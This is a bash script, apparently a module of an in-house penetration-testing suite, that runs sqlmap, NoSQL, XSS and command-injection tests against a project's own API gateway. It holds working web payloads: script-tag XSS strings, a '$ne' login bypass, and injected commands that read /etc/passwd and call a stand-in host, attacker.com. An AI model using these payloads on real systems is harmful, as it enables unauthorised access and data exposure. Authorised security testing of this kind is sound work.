#!/bin/bash
# scripts/security/kali/modules/04-injection-tests.sh

set -euo pipefail

RESULTS_DIR="/pentest/results/injection"
mkdir -p "$RESULTS_DIR"

TARGET="${API_GATEWAY_URL:-http://api-gateway:3000}"
AUTH_HEADER="Authorization: Bearer $AUTH_TOKEN"

log() { echo "[$(date +'%H:%M:%S')] $*"; }

log "Starting SQL Injection tests..."

# Test endpoints for SQL injection
ENDPOINTS=(
    "/api/v1/users?search="
    "/api/v1/organizations?name="
    "/api/v1/audit/logs?event_type="
    "/api/v1/files?filename="
)

for endpoint in "${ENDPOINTS[@]}"; do
    log "Testing: $endpoint"
    
    # Run SQLMap
    sqlmap -u "$TARGET$endpoint" \
        --batch \
        --level=3 \
        --risk=2 \
        --headers="$AUTH_HEADER" \
        --technique=BEUSTQ \
        --threads=5 \
        --output-dir="$RESULTS_DIR/sqlmap" \
        --answers="follow=N" \
        --timeout=30 \
        --retries=1 \
        2>&1 | tee -a "$RESULTS_DIR/sqlmap.log"
done

log "Testing NoSQL Injection..."
# Test for NoSQL injection in JSON bodies
curl -X POST "$TARGET/api/v1/auth/login" \
    -H "Content-Type: application/json" \
    -H "$AUTH_HEADER" \
    -d '{"email": {"$ne": null}, "password": {"$ne": null}}' \
    -w "\nStatus: %{http_code}\n" \
    >> "$RESULTS_DIR/nosql-injection.log" 2>&1

log "Testing XSS..."
# XSS payload testing
XSS_PAYLOADS=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert('XSS')>"
    "javascript:alert('XSS')"
    "<svg onload=alert('XSS')>"
)

for payload in "${XSS_PAYLOADS[@]}"; do
    # Test in various parameters
    curl -X POST "$TARGET/api/v1/users" \
        -H "Content-Type: application/json" \
        -H "$AUTH_HEADER" \
        -d "{\"first_name\": \"$payload\", \"last_name\": \"Test\", \"email\": \"test@test.com\"}" \
        -w "\nStatus: %{http_code}\n" \
        >> "$RESULTS_DIR/xss-test.log" 2>&1
done

# Use XSSer for automated XSS detection
# xsser --url="$TARGET/api/v1/users?search=XSS" \
#     --cookie="Authorization=$AUTH_TOKEN" \
#     --auto \
#     --threads=5 \
#     --timeout=30 \
#     --statistics \
#     > "$RESULTS_DIR/xsser-report.txt" 2>&1

log "Testing Command Injection..."
# Command injection payloads
CMD_PAYLOADS=(
    "; ls -la"
    "| cat /etc/passwd"
    "\`whoami\`"
    "\$(curl http://attacker.com)"
)

for payload in "${CMD_PAYLOADS[@]}"; do
    curl -X POST "$TARGET/api/v1/notifications/send" \
        -H "Content-Type: application/json" \
        -H "$AUTH_HEADER" \
        -d "{\"webhook_url\": \"http://localhost$payload\"}" \
        -w "\nStatus: %{http_code}\n" \
        >> "$RESULTS_DIR/command-injection.log" 2>&1
done

log "Injection tests complete. Results in $RESULTS_DIR"
